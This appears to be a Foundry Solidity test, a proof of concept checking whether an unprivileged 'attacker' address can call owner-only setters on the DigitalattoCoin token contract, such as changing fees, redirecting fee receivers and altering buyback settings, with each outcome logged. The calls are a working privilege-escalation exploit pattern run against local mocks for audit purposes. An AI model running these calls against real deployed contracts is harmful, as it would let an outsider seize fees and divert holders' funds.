// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DigitalattoCoin.sol";

interface IDividendDistributor {
    function minPeriod() external view returns (uint256);
    function minDistribution() external view returns (uint256);
}

contract MockWBNB {}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0xfac704AE606E4ACDFD6ACb6fE6A98d284f771F6E);
    }
}

contract MockRouter {
    address public immutable factory;
    address public immutable WBNB;

    constructor(address _factory, address _wbnb) {
        factory = _factory;
        WBNB = _wbnb;
    }

    function WETH() external view returns (address) {
        return WBNB;
    }
}

contract DigitalattoPrivilegeEscalationTest is Test {
    DigitalattoCoin token;
    IDividendDistributor distributor;
    address owner = address(this);
    address attacker = address(0x666);
    uint256 public successes;
    
    function setUp() public {
        // Deploy mock contracts
        MockWBNB wbnb = new MockWBNB();
        MockFactory factory = new MockFactory();
        MockRouter router = new MockRouter(address(factory), address(wbnb));
        
        // Deploy token and get distributor
        token = new DigitalattoCoin(address(router));
        distributor = IDividendDistributor(token.distributorAddress());
    }

    function test_PrivilegeEscalationViaSettings() public {
        uint256[] memory beforeState;
        uint256[] memory afterState;
        bool callSuccess;
        successes = 0;
        
        require(token.owner() == address(this), "Deployer should be owner");
        require(token.owner() != attacker, "Attacker shouldn't be owner initially");
        
        console.log("\n===== TESTING PRIVILEGED SETTINGS =====\n");
        
        // STAGE 1: setFees
        console.log("=== STAGE 1: setFees ===");
        console.log("--- BEFORE-Trigger ---");
        beforeState = new uint256[](5);
        beforeState[0] = token.liquidityFee();
        beforeState[1] = token.buybackFee();
        beforeState[2] = token.reflectionFee();
        beforeState[3] = token.marketingFee();
        beforeState[4] = token.feeDenominator();
        console.log("liquidityFee     :", beforeState[0]);
        console.log("buybackFee       :", beforeState[1]);
        console.log("reflectionFee    :", beforeState[2]);
        console.log("marketingFee     :", beforeState[3]);
        console.log("feeDenominator   :", beforeState[4]);
        
        console.log("--- Trigger: setFees(623,623,623,623,10000) by Attacker ---");
        vm.prank(attacker);
        (callSuccess,) = address(token).call(
            abi.encodeWithSignature("setFees(uint256,uint256,uint256,uint256,uint256)", 
            623, 623, 623, 623, 10000)
        );
        
        console.log("--- AFTER-Trigger ---");
        afterState = new uint256[](5);
        afterState[0] = token.liquidityFee();
        afterState[1] = token.buybackFee();
        afterState[2] = token.reflectionFee();
        afterState[3] = token.marketingFee();
        afterState[4] = token.feeDenominator();
        console.log("liquidityFee     :", afterState[0]);
        console.log("buybackFee       :", afterState[1]);
        console.log("reflectionFee    :", afterState[2]);
        console.log("marketingFee     :", afterState[3]);
        console.log("feeDenominator   :", afterState[4]);
        
        if (callSuccess && afterState[0] == 623 && afterState[1] == 623) {
            console.log("STATE CHANGED: YES, Vulnerability Exploited!");
            successes++;
        } else {
            console.log("STATE CHANGE: NO, Vulnerabilty Not Exploited");
        }
        console.log("");

        // STAGE 2: setAutoBuybackSettings
        console.log("=== STAGE 2: setAutoBuybackSettings ===");
        console.log("--- BEFORE-Trigger ---");
        beforeState = new uint256[](3);
        beforeState[0] = token.autoBuybackEnabled() ? 1 : 0;
        beforeState[1] = token.autoBuybackCap();
        beforeState[2] = token.autoBuybackAmount();
        console.log("autoBuybackEnabled:", beforeState[0] == 1 ? "true" : "false");
        console.log("autoBuybackCap     :", beforeState[1]);
        console.log("autoBuybackAmount  :", beforeState[2]);
        
        console.log("--- Trigger: setAutoBuybackSettings(true, max, max, 1) by Attacker ---");
        vm.prank(attacker);
        (callSuccess,) = address(token).call(
            abi.encodeWithSignature(
                "setAutoBuybackSettings(bool,uint256,uint256,uint256)", 
                true, type(uint256).max, type(uint256).max, 1
            )
        );
        
        console.log("--- AFTER-Trigger ---");
        afterState = new uint256[](3);
        afterState[0] = token.autoBuybackEnabled() ? 1 : 0;
        afterState[1] = token.autoBuybackCap();
        afterState[2] = token.autoBuybackAmount();
        console.log("autoBuybackEnabled:", afterState[0] == 1 ? "true" : "false");
        console.log("autoBuybackCap     :", afterState[1]);
        console.log("autoBuybackAmount  :", afterState[2]);
        
        if (callSuccess && afterState[0] == 1 && afterState[1] == type(uint256).max) {
            console.log("STATE CHANGED: YES, Vulnerability Exploited!");
            successes++;
        } else {
            console.log("STATE CHANGE: NO, Vulnerabilty Not Exploited");
        }
        console.log("");

        // STAGE 3: setSwapBackSettings
        console.log("=== STAGE 3: setSwapBackSettings ===");
        console.log("--- BEFORE-Trigger ---");
        beforeState = new uint256[](2);
        beforeState[0] = token.swapEnabled() ? 1 : 0;
        beforeState[1] = token.swapThreshold();
        console.log("swapEnabled   :", beforeState[0] == 1 ? "true" : "false");
        console.log("swapThreshold :", beforeState[1]);
        
        console.log("--- Trigger: setSwapBackSettings(true, max) by Attacker ---");
        vm.prank(attacker);
        (callSuccess,) = address(token).call(
            abi.encodeWithSignature("setSwapBackSettings(bool,uint256)", true, type(uint256).max)
        );
        
        console.log("--- AFTER-Trigger ---");
        afterState = new uint256[](2);
        afterState[0] = token.swapEnabled() ? 1 : 0;
        afterState[1] = token.swapThreshold();
        console.log("swapEnabled   :", afterState[0] == 1 ? "true" : "false");
        console.log("swapThreshold :", afterState[1]);
        
        if (callSuccess && afterState[0] == 1 && afterState[1] == type(uint256).max) {
            console.log("STATE CHANGED: YES, Vulnerability Exploited!");
            successes++;
        } else {
            console.log("STATE CHANGE: NO, Vulnerabilty Not Exploited");
        }
        console.log("");

        // STAGE 4: setFeeReceivers
        console.log("=== STAGE 4: setFeeReceivers ===");
        console.log("--- BEFORE-Trigger ---");
        address autoLiqReceiver = token.autoLiquidityReceiver();
        address marketingReceiver = token.marketingFeeReceiver();
        console.log("autoLiquidityReceiver:", autoLiqReceiver);
        console.log("marketingFeeReceiver  :", marketingReceiver);
        
        console.log("--- Trigger: setFeeReceivers(0x456, 0x789) by Attacker ---");
        vm.prank(attacker);
        (callSuccess,) = address(token).call(
            abi.encodeWithSignature("setFeeReceivers(address,address)", address(0x456), address(0x789))
        );
        
        console.log("--- AFTER-Trigger ---");
        address newAutoLiq = token.autoLiquidityReceiver();
        address newMarketing = token.marketingFeeReceiver();
        console.log("autoLiquidityReceiver:", newAutoLiq);
        console.log("marketingFeeReceiver  :", newMarketing);
        
        if (callSuccess && (newAutoLiq != autoLiqReceiver || newMarketing != marketingReceiver)) {
            console.log("STATE CHANGED: YES, Vulnerability Exploited!");
            successes++;
        } else {
            console.log("STATE CHANGE: NO, Vulnerabilty Not Exploited");
        }
        console.log("");

        // STAGE 5: setDistribution
        console.log("=== STAGE 5: setDistributionCriteria ===");
        console.log("--- BEFORE-Trigger ---");
        beforeState = new uint256[](2);
        beforeState[0] = distributor.minPeriod();
        beforeState[1] = distributor.minDistribution();
        console.log("minPeriod       :", beforeState[0]);
        console.log("minDistribution :", beforeState[1]);
        
        console.log("--- Trigger: setDistributionCriteria(1, 1) by Attacker ---");
        vm.prank(attacker);
        (callSuccess,) = address(token).call(
            abi.encodeWithSignature("setDistributionCriteria(uint256,uint256)", 1, 1)
        );
        
        console.log("--- AFTER-Trigger ---");
        afterState = new uint256[](2);
        afterState[0] = distributor.minPeriod();
        afterState[1] = distributor.minDistribution();
        console.log("minPeriod       :", afterState[0]);
        console.log("minDistribution :", afterState[1]);
        
        if (callSuccess && (afterState[0] != beforeState[0] || afterState[1] != beforeState[1])) {
            console.log("STATE CHANGED: YES, Vulnerability Exploited!");
            successes++;
        } else {
            console.log("STATE CHANGE: NO, Vulnerability Not Exploited");
        }
        console.log("");

        // STAGE 6: Additional functions
        console.log("=== STAGE 6: Additional Privileged Functions ===");
        
        // setDistributorSettings
        vm.prank(attacker);
        (callSuccess,) = address(token).call(
            abi.encodeWithSignature("setDistributorSettings(uint256)", 749999)
        );
        if (callSuccess) {
            console.log("setDistributorSettings: Exploited");
            successes++;
        } else {
            console.log("setDistributorSettings: Failed");
        }
        
        // setBuybackMultiplierSettings
        vm.prank(attacker);
        (callSuccess,) = address(token).call(
            abi.encodeWithSignature("setBuybackMultiplierSettings(uint256,uint256,uint256)", 
                                    200, 100, 1000)
        );
        if (callSuccess) {
            console.log("setBuybackMultiplierSettings: Exploited");
            successes++;
        } else {
            console.log("setBuybackMultiplierSettings: Failed");
        }
        
        // setTargetLiquidity
        vm.prank(attacker);
        (callSuccess,) = address(token).call(
            abi.encodeWithSignature("setTargetLiquidity(uint256,uint256)", 100, 100)
        );
        if (callSuccess) {
            console.log("setTargetLiquidity: Exploited");
            successes++;
        } else {
            console.log("setTargetLiquidity: Failed");
        }
        console.log("");

        // Final verdict
        console.log("=== FINAL VULNERABILITY ASSESSMENT ===");
        console.log("Exploited settings:", successes);
        
        if (successes > 0) {
            console.log("Vulnerability Exists: Attacker modified %d privileged settings", successes);
            assertTrue(successes > 0, "Privilege escalation confirmed");
        } else {
            console.log("Vulnerability not Exist: All malicious calls reverted");
            assertTrue(true, "Access control working as intended");
        }
    }
}